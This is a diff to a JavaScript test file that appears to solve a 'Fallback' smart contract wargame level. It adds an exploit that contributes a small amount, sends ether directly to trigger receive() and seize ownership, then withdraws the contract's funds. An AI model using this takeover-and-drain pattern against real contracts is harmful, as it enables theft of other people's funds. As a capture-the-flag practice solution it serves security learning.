@@ -18,7 +18,18 @@ describe("Fallback", async function () {
     });
 
     it("Exploit", async function () {
+        await instance.connect(player).contribute({ value: 1 });
 
+        // Call receive() on instance
+        await player.sendTransaction({
+            to: instance.address,
+            value: 1
+        });
+
+        // Player should have acquired ownership
+        expect(await instance.owner()).to.equal(player.address);
+
+        await instance.connect(player).withdraw();
     });
 
     after(async function () {
